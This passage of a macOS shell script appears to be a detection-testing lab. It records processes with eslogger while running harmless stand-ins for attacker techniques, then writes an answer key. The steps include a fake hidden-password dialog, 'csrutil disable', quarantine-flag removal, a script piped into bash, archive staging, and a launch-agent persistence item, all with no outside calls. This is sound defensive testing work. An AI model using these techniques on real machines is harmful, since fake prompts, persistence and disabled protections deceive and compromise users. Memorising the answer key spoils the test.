  answer prompt fake-prompt high queued 'with hidden answer' 'A dialog asking for hidden typed text, as a fake password prompt does.'
  answer prompt-check dscl-authonly high queued 'ficus-lab-nobody' 'A password check, against an account that does not exist.'
  answer keychain keychain-access high queued 'Ficus Lab Safe Storage' 'Asking for a "Safe Storage" key; this one does not exist, so nothing is read.'
  answer sip security-setting-change high queued 'csrutil disable' 'Trying to turn System Integrity Protection off; refused outside Recovery.'
  answer quarantine quarantine-strip high queued '-d com.apple.quarantine' 'Removing the quarantine flag from a file the lab flagged itself.'
  answer decode payload-decode med queued 'base64 -d' 'Decoding data on the fly.'
  answer staging archive-staging high queued 'stage.zip' 'Packing files into an archive in /tmp.'
  answer script-file osascript-script med queued 'collect.applescript' 'osascript runs a script file from /tmp.'
  answer odd-binary odd-location-exec high queued '/agent --lab' 'An ad-hoc signed copy of /usr/bin/true running from /tmp.'
  answer odd-binary adhoc low queued '/agent --lab' 'Ad-hoc signed: no developer identity.'
  answer app-shell shell-under-app med queued 'echo ficus-lab-applet' 'An AppleScript applet (an app) runs a shell with do shell script.'
  answer orphan orphaned low queued 'sleep 3' 'Its parent exited, so it ends up under launchd.'
  answer persist persistence-item high queued 'agent-template.plist' 'cp writes a launch agent plist into ~/Library/LaunchAgents (removed at the end) and macOS registers it; it runs a shell, so it is high. macOS likely shows a "Background Items Added" notification: that is what a real infection looks like too.'
  answer persist-load launchctl-load high queued 'launchctl bootstrap' 'launchctl starts the job now (it only runs "exit 0").'
  answer burst recon low burst sw_vers 'Three discovery tools within a minute under one shell: a recon burst.'
  answer burst recon low burst 'uname -a' 'Part of the same burst.'
  answer burst recon low burst hostname 'Part of the same burst.'
  answer setuid recon low context 'pid,comm' 'ps on its own: recon, context only.'
  answer setuid uid-mismatch low context 'pid,comm' 'ps is setuid root by design: an allow-listed Apple tool, context only.'
}

LAB=''
ES_PID=''
ES_ERR=''
PLIST=''
CLEANED=''
SUDO_CMD=sudo    # how the capture is stopped; plain sudo asks for the password again if the ticket ran out

# stop_capture: stop the recorder (ES_PID is the sudo running eslogger): SIGINT so eslogger flushes, then SIGTERM.
#   Waits a few seconds for each; never blocks for good. ps, not kill -0: the process belongs to root.
stop_capture() {
  [ -n "$ES_PID" ] || return 0
  local sig i
  for sig in INT TERM; do
    $SUDO_CMD kill "-$sig" "$ES_PID" 2>/dev/null
    i=0
    while ps -p "$ES_PID" >/dev/null 2>&1 && [ $i -lt 10 ]; do sleep 0.5; i=$((i + 1)); done
    if ! ps -p "$ES_PID" >/dev/null 2>&1; then
      wait "$ES_PID" 2>/dev/null
      ES_PID=''
      return 0
    fi
  done
  printf 'ficus-lab: eslogger is still recording. Stop it with: sudo kill %s\n' "$ES_PID" >&2
  return 1
}

# cleanup: undo everything live mode did. Runs once, with Ctrl-C ignored so a second one cannot cut it short.
cleanup() {
  trap '' INT TERM HUP
  [ -z "$CLEANED" ] || return 0
  CLEANED=1
  case $LAB in /tmp/ficus-lab.?*) pkill -f "$LAB/" 2>/dev/null ;; esac   # a step still running (the applet)
  if [ -n "$PLIST" ]; then
    launchctl bootout "gui/$(id -u)/$LIVE_LABEL" 2>/dev/null
    rm -f "$PLIST"
  fi
  if [ -n "$ES_PID" ]; then
    sleep 2
    stop_capture
  fi
  case $LAB in /tmp/ficus-lab.?*) rm -rf "$LAB" ;; esac
  [ -z "$ES_ERR" ] || rm -f "$ES_ERR"
}

# step LABEL COMMAND...: run one lab step as a child process in the lab folder; a failing step does not stop the run.
step() {
  printf '  - %s\n' "$1" >&2
  shift
  ( cd "$LAB" && exec "$@" ) >/dev/null 2>&1 || true
  sleep 1
}

# The steps, run by `ficus-lab.sh __steps LAB` once eslogger records, so the capture has that exec to search for.
# Programs by full path: a tool earlier on PATH (a pip-installed xattr) would not be the one the rules know.
live_steps() {
  local plist_src="$LAB/agent-template.plist"
  step 'download' /usr/bin/curl -s -o "$LAB/page.html" file:///etc/hosts
  printf '  - %s\n' 'a script piped into bash' >&2
  ( cd "$LAB" && printf 'whoami\n' | /bin/bash -s ) >/dev/null 2>&1 || true
  sleep 1
  step 'fake password prompt (type anything, or wait 8 s)' /usr/bin/osascript -e 'display dialog "Ficus lab: a harmless demo of a fake password prompt. Type anything, or wait." default answer "" with hidden answer with title "Ficus lab" giving up after 8'
  step 'password check for an account that does not exist' /usr/bin/dscl . -authonly ficus-lab-nobody not-a-password
  # A keychain file that does not exist: nothing to unlock, so no prompt for the real login keychain.
  step 'keychain lookup for an item that does not exist' /usr/bin/security find-generic-password -s 'Ficus Lab Safe Storage' -w "$LAB/none.keychain-db"
  step 'csrutil disable (refused outside Recovery)' /usr/bin/csrutil disable
  : > "$LAB/Installer.dmg"
  /usr/bin/xattr -w com.apple.quarantine '0081;00000000;Ficus;' "$LAB/Installer.dmg" 2>/dev/null
  step 'quarantine flag removed' /usr/bin/xattr -d com.apple.quarantine "$LAB/Installer.dmg"
  printf '  - %s\n' 'base64 -d' >&2
  ( cd "$LAB" && printf 'Z2FtZWxlaXJhIGxhYgo=\n' | /usr/bin/base64 -d ) >/dev/null 2>&1 || true
  sleep 1
  /bin/mkdir -p "$LAB/stage" && /bin/cp /etc/hosts "$LAB/stage/"
  step 'archive staged in /tmp' /usr/bin/ditto -c -k "$LAB/stage" "$LAB/stage.zip"
  printf 'return "ficus lab"\n' > "$LAB/collect.applescript"
  step 'osascript running a script file' /usr/bin/osascript "$LAB/collect.applescript"
  /bin/cp /usr/bin/true "$LAB/agent" && /usr/bin/codesign -f -s - "$LAB/agent" >/dev/null 2>&1
  step 'ad-hoc signed program in /tmp' "$LAB/agent" --lab
  # Compiled from a file, so only the applet's shell carries the marker on its command line.
  printf 'do shell script "echo ficus-lab-applet"\n' > "$LAB/applet.applescript"
  if /usr/bin/osacompile -o "$LAB/Lab Helper.app" "$LAB/applet.applescript" >/dev/null 2>&1; then
    printf '  - %s\n' 'an applet running a shell' >&2
    ( cd "$LAB" && exec "$LAB/Lab Helper.app/Contents/MacOS/applet" ) >/dev/null 2>&1 &
    local applet=$! i=0
    while kill -0 "$applet" 2>/dev/null && [ $i -lt 15 ]; do sleep 1; i=$((i + 1)); done
    kill "$applet" 2>/dev/null
    wait "$applet" 2>/dev/null
  fi
  printf '  - %s\n' '(sleep 3 &): detached from its parent' >&2
  ( cd "$LAB" && ( /bin/sleep 3 & ) )
  sleep 1
  printf '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n  <key>Label</key><string>%s</string>\n  <key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>exit 0</string></array>\n  <key>RunAtLoad</key><false/>\n</dict>\n</plist>\n' "$LIVE_LABEL" > "$plist_src"
  /bin/mkdir -p "$HOME/Library/LaunchAgents"
  step 'launch agent plist written (removed at the end)' /bin/cp "$plist_src" "$HOME/Library/LaunchAgents/$LIVE_LABEL.plist"
  step 'launchctl bootstrap' /bin/launchctl bootstrap "gui/$(id -u)" "$HOME/Library/LaunchAgents/$LIVE_LABEL.plist"
  printf '/usr/bin/sw_vers\n/usr/bin/uname -a\n/bin/hostname\n:\n' > "$LAB/recon.sh"
  step 'recon burst' /bin/sh "$LAB/recon.sh"
  step 'ps (setuid root)' /bin/ps -p $$ -o pid,comm
}

live_run() {
  local out=$1 answers=$2 uid=${FICUS_LAB_FAKE_UID:-$(id -u)}
  [ "$(uname -s)" = Darwin ] || die "live mode runs only on macOS (eslogger is part of macOS). Use: $0 synthetic"
  [ "$uid" != 0 ] || die "run live mode as yourself, not as root (without sudo): it asks for your password for eslogger only."
  command -v eslogger >/dev/null || die "eslogger not found (it ships with macOS 13 and later)"
  cat >&2 <<EOF
Ficus lab, live mode. It will:
  - ask for your password, for sudo eslogger only; every other step runs as you;
  - show a dialog (type anything, or wait 8 s);
  - write a launch agent ($LIVE_LABEL) and remove it at the end: macOS will likely show a
    "Background Items Added" notification;
  - run everything in a temporary folder under /tmp and remove it at the end, also on Ctrl-C.
The capture records every process on this Mac for about a minute, with their environment and your user
name: review it before you share it. The terminal needs Full Disk Access for eslogger to start.

EOF
  sudo -v || die "sudo is needed for eslogger"
  mkdir -p "$(dirname "$out")" "$(dirname "$answers")" || die "cannot create the folder for $out"
  trap cleanup EXIT
  trap 'exit 130' INT TERM HUP
  LAB=$(mktemp -d /tmp/ficus-lab.XXXXXX) || die "cannot create the lab folder"
  ES_ERR=$(mktemp /tmp/ficus-lab-eslogger.XXXXXX) || die "cannot create a temporary file"
  PLIST=$HOME/Library/LaunchAgents/$LIVE_LABEL.plist
  : > "$out"
  sudo -n eslogger fork exec exit create rename unlink setextattr btm_launch_item_add btm_launch_item_remove > "$out" 2> "$ES_ERR" &
  ES_PID=$!
  local i=0
  while [ ! -s "$out" ]; do
    if ! ps -p "$ES_PID" >/dev/null 2>&1; then
      ES_PID=''
      cat "$ES_ERR" >&2
      die "eslogger stopped before recording anything (does the terminal have Full Disk Access?)"
    fi
    [ $i -lt 30 ] || die "eslogger recorded nothing in 15 s"
    sleep 0.5
    i=$((i + 1))
  done
  printf 'Recording. Steps:\n' >&2
  sleep 5
  /bin/bash "$SELF" __steps "$LAB" || true
  sleep 5
  cleanup
  trap - EXIT INT TERM HUP
  [ -z "$ES_PID" ] || die "the capture in $out may still be growing"
  live_answers 4>"$answers"
  printf '\nwrote %s (%s lines)\nanswer key %s\nLoad the capture into Ficus and check the queue against the key.\n' \
    "$out" "$(wc -l < "$out" | tr -d ' ')" "$answers" >&2
}

# ---- command line -----------------------------------------------------------------------------------------------
REPO=$(cd "$(dirname "$0")/.." 2>/dev/null && pwd)
SELF=$(cd "$(dirname "$0")" 2>/dev/null && pwd)/${0##*/}

[ -n "${FICUS_LAB_SOURCE_ONLY:-}" ] && return 0

main() {
  local mode=${1:-} out='' to=files
  case $mode in
    -h|--help|help) usage; exit 0 ;;
    synthetic|live) shift ;;
    __steps)
      # Internal: the live steps, in a child process of live mode.
      case ${2:-} in /tmp/ficus-lab.?*) ;; *) die "__steps needs the lab folder live mode made (/tmp/ficus-lab.XXXXXX)" ;; esac
      [ -d "$2" ] || die "__steps: no lab folder $2"
      LAB=$2
      live_steps
      exit 0 ;;
    *) usage >&2; exit 2 ;;
  esac
  while [ $# -gt 0 ]; do
    case $1 in
      -h|--help) usage; exit 0 ;;
      -o) [ $# -ge 2 ] || { usage >&2; exit 2; }; out=$2; shift 2 ;;
      --stdout) [ "$mode" = synthetic ] || { usage >&2; exit 2; }; to=stdout; shift ;;
      --answers) to=answers; shift ;;
      *) usage >&2; exit 2 ;;
    esac
  done
  [ -n "$out" ] || out=$REPO/scratch/ficus-lab-$mode.jsonl
  local answers=${out%.jsonl}.answers.tsv
  [ "$answers" != "$out" ] || answers=$out.answers.tsv

  if [ "$mode" = live ]; then
    case $to in
      answers) live_answers 4>&1 ;;
      *) live_run "$out" "$answers" ;;
    esac
    exit 0
  fi
  case $to in
    stdout) synthetic_story 3>&1 4>/dev/null ;;
    answers) synthetic_story 3>/dev/null 4>&1 ;;
    files)
      mkdir -p "$(dirname "$out")" "$(dirname "$answers")" || die "cannot create the folder for $out"
      synthetic_story 3>"$out" 4>"$answers"
      printf 'wrote %s\nanswer key %s\n' "$out" "$answers" >&2 ;;
  esac
}

main "$@"
